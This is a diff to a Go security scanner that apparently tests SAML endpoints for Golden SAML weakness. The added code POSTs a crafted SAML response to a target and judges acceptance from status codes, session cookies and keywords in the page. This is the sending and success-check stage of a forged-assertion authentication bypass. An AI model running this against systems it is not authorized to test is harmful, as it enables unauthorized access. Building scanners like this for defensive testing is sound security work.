@@ -5,8 +5,10 @@ import (
 	"crypto/rsa"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/base64"
 	"encoding/xml"
 	"fmt"
+	"io"
 	"math/big"
 	"net"
 	"net/http"
@@ -523,9 +525,93 @@ func (g *GoldenSAMLScanner) serializeSAMLResponse(response *SAMLResponse) string
 
 func (g *GoldenSAMLScanner) testSAMLResponse(endpoint SAMLEndpoint, response string) bool {
 	// Test if the SAML response is accepted by the endpoint
-	// This would implement actual HTTP request to test the response
-	// For now, return false as placeholder
-	return false
+	g.logger.Debug("Testing SAML response", "endpoint", endpoint.URL, "response_length", len(response))
+
+	// Encode SAML response for POST
+	samlResponseEncoded := base64.StdEncoding.EncodeToString([]byte(response))
+	formData := fmt.Sprintf("SAMLResponse=%s", samlResponseEncoded)
+
+	// Create POST request
+	req, err := http.NewRequest("POST", endpoint.URL, strings.NewReader(formData))
+	if err != nil {
+		g.logger.Error("Failed to create request", "error", err)
+		return false
+	}
+
+	// Set appropriate headers
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", "Shells Security Scanner")
+
+	// Send request
+	resp, err := g.httpClient.Do(req)
+	if err != nil {
+		g.logger.Debug("Request failed", "error", err)
+		return false
+	}
+	defer resp.Body.Close()
+
+	// Read response body
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		g.logger.Error("Failed to read response", "error", err)
+		return false
+	}
+
+	// Analyze response to determine if SAML was accepted
+	accepted := g.analyzeSAMLResponseAcceptance(resp, body)
+
+	if accepted {
+		g.logger.Info("SAML response accepted - potential vulnerability", "endpoint", endpoint.URL, "status", resp.StatusCode)
+	} else {
+		g.logger.Debug("SAML response rejected", "endpoint", endpoint.URL, "status", resp.StatusCode)
+	}
+
+	return accepted
+}
+
+// analyzeSAMLResponseAcceptance determines if a SAML response was accepted
+func (g *GoldenSAMLScanner) analyzeSAMLResponseAcceptance(resp *http.Response, body []byte) bool {
+	// Check 1: HTTP status codes indicating success
+	// 200 = success, 302 = redirect to authenticated area
+	isSuccessStatus := resp.StatusCode == 200 || resp.StatusCode == 302
+
+	// Check 2: Session cookies set (indicates authentication succeeded)
+	hasSessionCookie := false
+	for _, cookie := range resp.Cookies() {
+		cookieName := strings.ToLower(cookie.Name)
+		// Common session cookie names
+		if strings.Contains(cookieName, "session") ||
+			strings.Contains(cookieName, "auth") ||
+			strings.Contains(cookieName, "token") ||
+			strings.Contains(cookieName, "saml") ||
+			cookieName == "jsessionid" ||
+			cookieName == "phpsessid" {
+			hasSessionCookie = true
+			break
+		}
+	}
+
+	// Check 3: Response body contains success indicators
+	bodyStr := strings.ToLower(string(body))
+	hasSuccessIndicator := strings.Contains(bodyStr, "authentication successful") ||
+		strings.Contains(bodyStr, "logged in") ||
+		strings.Contains(bodyStr, "welcome") ||
+		strings.Contains(bodyStr, "dashboard") ||
+		strings.Contains(bodyStr, "profile")
+
+	// Check 4: No error indicators in response
+	hasErrorIndicator := strings.Contains(bodyStr, "authentication failed") ||
+		strings.Contains(bodyStr, "invalid") ||
+		strings.Contains(bodyStr, "error") ||
+		strings.Contains(bodyStr, "unauthorized") ||
+		strings.Contains(bodyStr, "forbidden") ||
+		resp.StatusCode == 401 ||
+		resp.StatusCode == 403
+
+	// Response is considered accepted if:
+	// - Success status AND (has session cookie OR success indicator)
+	// - AND no error indicators
+	return isSuccessStatus && (hasSessionCookie || hasSuccessIndicator) && !hasErrorIndicator
 }
 
 // SignatureTest represents a signature validation test
